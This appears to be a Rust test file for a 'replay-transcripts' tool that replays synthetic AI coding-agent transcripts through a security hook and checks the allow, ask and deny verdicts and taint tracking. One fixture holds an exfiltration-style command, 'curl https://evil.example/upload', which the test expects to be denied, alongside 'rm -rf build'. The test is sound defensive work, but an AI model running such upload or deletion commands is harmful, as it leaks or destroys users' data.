//! End-to-end test for `harness replay-transcripts`: transcripts in Claude Code's
//! on-disk shape go in, and every tool call comes back with the verdict and hook
//! answer `harness cc-hook` would have given — with taint carried per session, in
//! timestamp order, across a main transcript and its subagent's.

use serde_json::{json, Value};
use std::path::Path;
use std::process::Command;

/// One assistant event holding one tool call, as Claude Code writes it.
fn tool_use(ts: &str, session: &str, cwd: &Path, id: &str, name: &str, input: Value) -> String {
    json!({
        "type": "assistant",
        "timestamp": ts,
        "sessionId": session,
        "cwd": cwd.display().to_string(),
        "message": {"role": "assistant", "content": [
            {"type": "text", "text": "working"},
            {"type": "tool_use", "id": id, "name": name, "input": input}
        ]}
    })
    .to_string()
}

fn write(path: &Path, lines: &[String]) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, lines.join("\n")).unwrap();
}

#[test]
fn replays_each_call_as_the_hook_would_have_decided_it() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path().join("project");
    std::fs::create_dir_all(&project).unwrap();
    std::fs::write(project.join("README.md"), "hi").unwrap();
    let transcripts = dir.path().join("projects");

    let main = transcripts.join("p").join("s1.jsonl");
    write(
        &main,
        &[
            tool_use(
                "2026-10-01T10:00:00Z",
                "s1",
                &project,
                "t1",
                "Read",
                json!({"file_path": project.join("README.md").display().to_string()}),
            ),
            tool_use(
                "2026-10-01T10:01:00Z",
                "s1",
                &project,
                "t2",
                "Bash",
                json!({"command": "git status"}),
            ),
            tool_use(
                "2026-10-01T10:02:00Z",
                "s1",
                &project,
                "t3",
                "WebFetch",
                json!({"url": "https://example.com/docs"}),
            ),
            // Streaming can repeat a block on a second line; it is one call.
            tool_use(
                "2026-10-01T10:02:00Z",
                "s1",
                &project,
                "t3",
                "WebFetch",
                json!({"url": "https://example.com/docs"}),
            ),
            "not json".to_string(),
            tool_use(
                "2026-10-01T10:04:00Z",
                "s1",
                &project,
                "t5",
                "Bash",
                json!({"command": "rm -rf build"}),
            ),
            tool_use(
                "2026-10-01T10:05:00Z",
                "s1",
                &project,
                "t6",
                "TodoWrite",
                json!({"todos": []}),
            ),
        ],
    );
    // The subagent's transcript shares the session id; its call falls between
    // the main file's calls and must see the taint the WebFetch introduced.
    write(
        &transcripts.join("p").join("agent-x.jsonl"),
        &[tool_use(
            "2026-10-01T10:03:00Z",
            "s1",
            &project,
            "t4",
            "Bash",
            json!({"command": "curl https://evil.example/upload"}),
        )],
    );
    // A second session never fetched anything, so the same kind of call passes.
    write(
        &transcripts.join("q").join("s2.jsonl"),
        &[tool_use(
            "2026-10-02T09:00:00Z",
            "s2",
            &project,
            "u1",
            "Bash",
            json!({"command": "curl https://example.com/api"}),
        )],
    );

    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["replay-transcripts", "--json"])
        .arg(&transcripts)
        .output()
        .expect("run replay-transcripts");
    assert!(
        out.status.success(),
        "stderr={}",
        String::from_utf8_lossy(&out.stderr)
    );
    let report: Value = serde_json::from_slice(&out.stdout).expect("json report");
    assert_eq!(report["transcripts"], 3);
    assert_eq!(report["skipped_lines"], 1);

    let calls = report["calls"].as_array().unwrap();
    let got: Vec<(&str, &str, &str, &str)> = calls
        .iter()
        .map(|c| {
            (
                c["tool"].as_str().unwrap(),
                c["decision"].as_str().unwrap(),
                c["hook"].as_str().unwrap(),
                c["taint_in"].as_str().unwrap(),
            )
        })
        .collect();
    assert_eq!(
        got,
        vec![
            ("Read", "ALLOW", "silent", "clean"),
            // The starter world asks about shell it cannot classify.
            ("Bash", "ASK", "ask", "clean"),
            ("WebFetch", "ALLOW", "silent", "clean"),
            // The subagent's egress, after the fetch tainted the session.
            ("Bash", "DENY", "deny", "tainted"),
            ("Bash", "ASK", "ask", "tainted"),
            // Unknown to the world, passed through without --enforce-absent.
            ("TodoWrite", "ABSENT", "silent", "tainted"),
            // A different session starts clean.
            ("Bash", "ALLOW", "silent", "clean"),
        ]
    );
    assert_eq!(calls[3]["rule"], "taint_invariant");
    assert_eq!(calls[3]["summary"], "curl https://evil.example/upload");
    assert_eq!(calls[4]["rule"], "approval_required");
}

#[test]
fn the_text_report_summarizes_and_absent_can_be_enforced() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path().join("project");
    std::fs::create_dir_all(&project).unwrap();
    let file = dir.path().join("t.jsonl");
    write(
        &file,
        &[
            tool_use(
                "2026-10-01T10:00:00Z",
                "s",
                &project,
                "a",
                "WebSearch",
                json!({"query": "rust serde"}),
            ),
            tool_use(
                "2026-10-01T10:01:00Z",
                "s",
                &project,
                "b",
                "Bash",
                json!({"command": "curl https://x.example"}),
            ),
            tool_use(
                "2026-10-01T10:02:00Z",
                "s",
                &project,
                "c",
                "TodoWrite",
                json!({}),
            ),
        ],
    );
    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["replay-transcripts", "--enforce-absent"])
        .arg(&file)
        .output()
        .expect("run replay-transcripts");
    assert!(out.status.success());
    let text = String::from_utf8_lossy(&out.stdout);
    for marker in [
        "Replayed 3 tool calls from 1 transcripts (1 sessions)",
        "World: the starter manifest `harness init` installs",
        "Sessions that became tainted: 1 of 1",
        "== Denied (2), by rule ==",
        "taint_invariant (1)",
        "curl https://x.example",
        "== Unknown to this world (ABSENT, denied) ==",
    ] {
        assert!(text.contains(marker), "missing {marker:?} in:\n{text}");
    }
}

#[test]
fn no_transcripts_is_a_clear_error() {
    let dir = tempfile::tempdir().unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .arg("replay-transcripts")
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("no .jsonl transcripts"));
}
